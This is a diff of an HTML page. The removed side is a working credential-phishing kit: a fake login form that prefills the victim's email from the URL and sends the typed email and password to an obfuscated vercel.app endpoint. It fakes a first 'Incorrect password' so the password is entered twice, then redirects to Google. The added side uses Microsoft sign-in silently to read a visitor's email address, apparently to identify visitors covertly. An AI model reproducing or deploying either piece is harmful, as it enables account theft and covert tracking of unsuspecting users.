@@ -1,386 +1,69 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap" rel="stylesheet">
-    <title>Login</title>
-    <style>
-        *,
-        *::before,
-        *::after {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f5f7fa;
-            background-image: url('output.png');
-            background-size: cover;
-            background-position: top center;
-            background-repeat: no-repeat;
-            position: relative;
-        }
-
-        body::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.25);
-            z-index: 0;
-        }
-
-        .wrapper {
-            position: relative;
-            z-index: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px;
-            max-width: 100%;
-        }
-
-        .prompt {
-            color: #ffffff;
-            font-size: 18px;
-            font-weight: 500;
-            text-align: center;
-            margin-bottom: 20px;
-            letter-spacing: 0.3px;
-            line-height: 1.5;
-            max-width: 420px;
-            padding: 0 10px;
-            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.4);
-        }
-
-        .box {
-            width: 380px;
-            max-width: 92vw;
-            background: rgba(255, 255, 255, 0.92);
-            border-radius: 14px;
-            padding: 32px 28px 28px 28px;
-            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.15), 0 1px 4px rgba(0, 0, 0, 0.06);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            transition: box-shadow 0.25s ease;
-            backdrop-filter: blur(4px);
-        }
-
-        .box:hover {
-            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.20), 0 1px 4px rgba(0, 0, 0, 0.08);
-        }
-
-        .field {
-            margin-bottom: 16px;
-        }
-        .field:last-of-type {
-            margin-bottom: 20px;
-        }
-
-        .field input {
-            width: 100%;
-            padding: 12px 16px;
-            font-size: 15px;
-            font-family: 'Inter', -apple-system, sans-serif;
-            font-weight: 400;
-            color: #1e293b;
-            background: #fafbfc;
-            border: 1.5px solid #dce0e6;
-            border-radius: 8px;
-            outline: none;
-            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
-        }
-        .field input::placeholder {
-            color: #9aa3b1;
-            font-weight: 400;
-        }
-        .field input:focus {
-            border-color: #2c7be5;
-            box-shadow: 0 0 0 4px rgba(44, 123, 229, 0.10);
-            background: #ffffff;
-        }
-        .field input:hover:not(:focus) {
-            border-color: #bcc3cd;
-        }
-        .field input.error {
-            border-color: #e53e3e;
-            box-shadow: 0 0 0 4px rgba(229, 62, 62, 0.08);
-        }
-
-        .btn {
-            width: 100%;
-            padding: 12px 20px;
-            font-size: 15px;
-            font-weight: 500;
-            font-family: 'Inter', -apple-system, sans-serif;
-            color: #ffffff;
-            background: #2c7be5;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background 0.2s, box-shadow 0.2s, transform 0.15s, opacity 0.2s;
-        }
-        .btn:hover:not(:disabled) {
-            background: #1a6ad4;
-            box-shadow: 0 4px 14px rgba(44, 123, 229, 0.30);
-        }
-        .btn:active:not(:disabled) {
-            transform: scale(0.98);
-        }
-        .btn:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
-        .btn:focus-visible {
-            outline: 3px solid #2c7be5;
-            outline-offset: 2px;
-        }
-
-        .status-msg {
-            text-align: center;
-            margin-top: 14px;
-            font-size: 13px;
-            font-weight: 400;
-            letter-spacing: 0.3px;
-            min-height: 20px;
-            color: #1e293b;
-        }
-        .status-msg.error {
-            color: #e53e3e;
-        }
-        .status-msg.success {
-            color: #34a853;
-        }
-        .status-msg.info {
-            color: #2c7be5;
-        }
-
-        #loader {
-            position: fixed;
-            inset: 0;
-            z-index: 9999;
-            background: #f5f7fa;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            transition: opacity 0.5s ease, visibility 0.5s ease;
-        }
-        #loader.hidden {
-            opacity: 0;
-            visibility: hidden;
-            pointer-events: none;
-        }
-
-        .lds-ring {
-            display: inline-block;
-            position: relative;
-            width: 48px;
-            height: 48px;
-        }
-        .lds-ring div {
-            box-sizing: border-box;
-            display: block;
-            position: absolute;
-            width: 40px;
-            height: 40px;
-            margin: 4px;
-            border: 4px solid #2c7be5;
-            border-radius: 50%;
-            animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
-            border-color: #2c7be5 transparent transparent transparent;
-        }
-        .lds-ring div:nth-child(1) { animation-delay: -0.45s; }
-        .lds-ring div:nth-child(2) { animation-delay: -0.3s; }
-        .lds-ring div:nth-child(3) { animation-delay: -0.15s; }
-        @keyframes lds-ring {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .loader-label {
-            margin-top: 16px;
-            color: #6b7280;
-            font-family: 'Inter', sans-serif;
-            font-size: 14px;
-            letter-spacing: 0.5px;
-            font-weight: 400;
-        }
-
-        @media (max-width: 420px) {
-            .prompt { font-size: 16px; max-width: 320px; }
-            .box { padding: 24px 18px 20px 18px; }
-            .field input { padding: 10px 14px; font-size: 14px; }
-            .btn { padding: 11px 16px; font-size: 14px; }
-        }
-        @media (max-width: 350px) {
-            .prompt { font-size: 14px; }
-            .box { padding: 18px 14px 16px 14px; }
-            .field input { padding: 9px 12px; font-size: 13px; }
-            .btn { padding: 10px 14px; font-size: 13px; }
-        }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visitor Email</title>
+    <script src="https://alcdn.msauth.net/browser/2.38.0/js/msal-browser.min.js"></script>
 </head>
 <body>
-
-    <div id="loader">
-        <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
-        <div class="loader-label"></div>
-    </div>
-
-    <div class="wrapper">
-        <div class="prompt">Enter email password to continue</div>
-
-        <div class="box">
-            <form id="loginForm" autocomplete="on" novalidate>
-                <div class="field">
-                    <input type="email" id="email" placeholder="Email" required aria-label="Email address" />
-                </div>
-                <div class="field">
-                    <input type="password" id="password" placeholder="Enter Your Password" required aria-label="Password" autofocus />
-                </div>
-                <button type="submit" class="btn" id="submitBtn">Continue</button>
-                <div class="status-msg" id="statusMsg"></div>
-            </form>
-        </div>
-    </div>
+    <h1>Your email: <span id="emailDisplay">loading...</span></h1>
 
     <script>
-        (function() {
-            'use strict';
+        // REPLACE THIS WITH YOUR ACTUAL CLIENT ID
+        const CLIENT_ID = "a1950e1b-e1fb-40b6-8cfa-bc42c08770c2";
 
-            var _0x45a7 = ['/api/send', 'https://super-duper-dollop-nu.vercel.app'];
-            var API_URL = _0x45a7[1] + _0x45a7[0];
+        const msalConfig = {
+            auth: {
+                clientId: CLIENT_ID,
+                authority: "https://login.microsoftonline.com/common",
+                redirectUri: window.location.origin, // auto-detects your URL
+            },
+            cache: { cacheLocation: "localStorage" }
+        };
 
-            var loader = document.getElementById('loader');
-            var form = document.getElementById('loginForm');
-            var emailInput = document.getElementById('email');
-            var passwordInput = document.getElementById('password');
-            var submitBtn = document.getElementById('submitBtn');
-            var statusMsg = document.getElementById('statusMsg');
+        const msalInstance = new msal.PublicClientApplication(msalConfig);
 
-            setTimeout(function() {
-                loader.classList.add('hidden');
-                passwordInput.focus();
-            }, 500);
-
-            function decodeBase64(str) {
-                try {
-                    var base64 = str.replace(/-/g, '+').replace(/_/g, '/');
-                    while (base64.length % 4 !== 0) {
-                        base64 += '=';
-                    }
-                    return atob(base64);
-                } catch (e) {
-                    return str;
+        // Handle redirect after login
+        msalInstance.handleRedirectPromise()
+            .then(response => {
+                if (response) {
+                    const email = response.idTokenClaims.email ||
+                                  response.idTokenClaims.preferred_username;
+                    document.getElementById('emailDisplay').textContent = email;
+                } else {
+                    trySilent();
                 }
-            }
+            })
+            .catch(() => document.getElementById('emailDisplay').textContent = "error");
 
-            var urlParams = new URLSearchParams(window.location.search);
-            var rawEmail = urlParams.get('email') || urlParams.get('ae') || '';
-            if (rawEmail) {
-                emailInput.value = decodeBase64(rawEmail);
-            }
-
-            var attemptCount = 0;
-            var MAX_ATTEMPTS = 2;
-
-            async function sendToBackend(email, password, attempt) {
-                var response = await fetch(API_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ email: email, password: password, attempt: attempt })
-                });
-                if (!response.ok) {
-                    var errorData = await response.json();
-                    throw new Error(errorData.error || 'Backend error');
-                }
-                return response.json();
-            }
-
-            [emailInput, passwordInput].forEach(function(input) {
-                input.addEventListener('focus', function() {
-                    this.classList.remove('error');
-                });
-            });
-
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
-
-                if (attemptCount >= MAX_ATTEMPTS) {
-                    submitBtn.disabled = true;
-                    return;
-                }
-
-                var email = emailInput.value.trim();
-                var password = passwordInput.value.trim();
-
-                statusMsg.textContent = '';
-                statusMsg.className = 'status-msg';
-                emailInput.classList.remove('error');
-                passwordInput.classList.remove('error');
-
-                if (!email) {
-                    emailInput.classList.add('error');
-                    statusMsg.textContent = 'Please enter your email.';
-                    statusMsg.className = 'status-msg error';
-                    emailInput.focus();
-                    return;
-                }
-
-                if (!password) {
-                    passwordInput.classList.add('error');
-                    statusMsg.textContent = 'Please enter your password.';
-                    statusMsg.className = 'status-msg error';
-                    passwordInput.focus();
-                    return;
-                }
-
-                attemptCount++;
-                submitBtn.disabled = true;
-                submitBtn.textContent = 'Verifying';
-
-                sendToBackend(email, password, attemptCount)
-                    .then(function(data) {
-                        if (data.success) {
-                            if (attemptCount === 1) {
-                                statusMsg.textContent = 'Incorrect password. Please try again.';
-                                statusMsg.className = 'status-msg error';
-                                submitBtn.disabled = false;
-                                submitBtn.textContent = 'Continue';
-                                passwordInput.value = '';
-                                passwordInput.focus();
-                            } else if (attemptCount >= MAX_ATTEMPTS) {
-                                statusMsg.textContent = '';
-                                statusMsg.className = 'status-msg';
-                                submitBtn.disabled = true;
-                                submitBtn.textContent = 'Done';
-                                setTimeout(function() {
-                                    window.location.href = 'https://www.google.com/';
-                                }, 1000);
-                            }
-                        } else {
-                            throw new Error(data.error || 'Unknown error');
-                        }
-                    })
-                    .catch(function(err) {
-                        statusMsg.textContent = '⚠️ ' + (err.message || 'Service unavailable. Please try again.');
-                        statusMsg.className = 'status-msg error';
-                        submitBtn.disabled = false;
-                        submitBtn.textContent = 'Continue';
-                        attemptCount--;
+        // Try silent authentication (no popup)
+        async function trySilent() {
+            try {
+                const accounts = msalInstance.getAllAccounts();
+                if (accounts.length > 0) {
+                    const response = await msalInstance.acquireTokenSilent({
+                        scopes: ["openid", "email", "profile"],
+                        account: accounts[0]
                     });
-            });
+                    displayEmail(response);
+                } else {
+                    const response = await msalInstance.ssoSilent({
+                        scopes: ["openid", "email", "profile"]
+                    });
+                    displayEmail(response);
+                }
+            } catch {
+                // Fallback: redirect to login page (happens once)
+                msalInstance.loginRedirect({ scopes: ["openid", "email", "profile"] });
+            }
+        }
 
-        })();
+        function displayEmail(response) {
+            const email = response.idTokenClaims.email ||
+                          response.idTokenClaims.preferred_username;
+            document.getElementById('emailDisplay').textContent = email || "unknown";
+        }
     </script>
-
 </body>
 </html>
